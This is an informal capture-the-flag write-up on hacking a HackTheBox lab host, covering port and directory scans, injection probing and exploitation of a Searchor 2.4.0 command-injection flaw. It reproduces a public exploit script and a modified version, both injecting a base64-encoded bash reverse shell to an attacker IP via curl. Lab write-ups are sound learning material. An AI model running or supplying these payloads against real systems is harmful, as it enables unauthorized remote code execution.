```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 19:38 EDT
Nmap scan report for 10.10.11.208
Host is up (0.025s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.08 seconds
```

```
gobuster dir -u http://searcher.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

found: /search

gobuster dir -u http://searcher.htb/search/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

found: nothing
```

nothing is being found..... im going to scan UDP ports see if anything is there:
```
sudo nmap -sU -Pn --top-ports 100 -T3 10.10.11.208
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 19:54 EDT
Nmap scan report for searcher.htb (10.10.11.208)
Host is up (0.024s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc

Nmap done: 1 IP address (1 host up) scanned in 107.82 seconds

```
OOOO
but it is filtered so this will be a last resort.....

I checked back at the website:

and sent the post request to the repeater, 

i saw if i add a ' character to the query parameter that i wasnt getting the response i expected:
```
engine=Google&query=pwned

translates to:
https://www.google.com/search?q=pwned

but if i do:
engine=Google&query=pwned'

i get nothing just a 200
```
hmmmmm, possible server side injection????

Lets try out some other things:
```
pwned'%2bprint('pwned')%2b
```

still nothing just a 200....

not to good at injecting, im gonna look for a vuln to :
`Powered by [Flask](https://flask.palletsprojects.com) and [Searchor 2.4.0](https://github.com/ArjunSharda/Searchor)`

as this is at the bottom of the home page:
`searchsploit searchor`

nothing.....

let me google....

pays to keep digging!
https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection

this is exactly the version running and was the first thing to pop up lol

check the code to make sure im not getting hacked myself hacking htb...
```
#!/bin/bash -

default_port="9001"
port="${3:-$default_port}"
rev_shell_b64=$(echo -ne "bash  -c 'bash -i >& /dev/tcp/$2/${port} 0>&1'" | base64)
evil_cmd="',__import__('os').system('echo ${rev_shell_b64}|base64 -d|bash -i')) # junky comment"
plus="+"

echo "---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---"

if [ -z "${evil_cmd##*$plus*}" ]
then
    evil_cmd=$(echo ${evil_cmd} | sed -r 's/[+]+/%2B/g')
fi

if [ $# -ne 0 ]
then
    echo "[*] Input target is $1"
    echo "[*] Input attacker is $2:${port}"
    echo "[*] Run the Reverse Shell... Press Ctrl+C after successful connection"
    curl -s -X POST $1/search -d "engine=Google&query=${evil_cmd}" 1> /dev/null
else 
    echo "[!] Please specify a IP address of target and IP address/Port of attacker for Reverse Shell, for example: 

./exploit.sh <TARGET> <ATTACKER> <PORT> [9001 by default]"
fi
```

CLEAN!

lets send it :
```
./searchor.sh 10.10.11.208 10.10.14.3
---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---
[*] Input target is 10.10.11.208
[*] Input attacker is 10.10.14.3:9001
[*] Run the Reverse Shell... Press Ctrl+C after successful connection
```

Didn't work, so i went back in the website and was messing around, looks like it needs to be URL-encoded for it to work, so i just made things simple and used my own code that i took from our boy above, shout out him:
```
#!/bin/bash -

rev_shell_b64=$(echo -ne "bash -i >& /dev/tcp/10.10.14.3/9001 0>&1" | base64)
evil_cmd="',__import__('os').system('echo ${rev_shell_b64}|base64 -d|bash -i')) #"
url_encoded_cmd=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"${evil_cmd}\"))")

echo "[*] Run the Reverse Shell... Press Ctrl+C after successful connection"
curl -s -X POST http://searcher.htb/search -d "engine=Google&query=${url_encoded_cmd}"
```

:D

```
svc@busqueda:~$ cat user.txt
cat user.txt
c43f6be03dc7e0f171c552****
```

USER PWNED!
*Took a lil longer than expected but lets be real this was for sure the exploit, so i was for sure going down this bunny hole*

---

### PRIV ESC

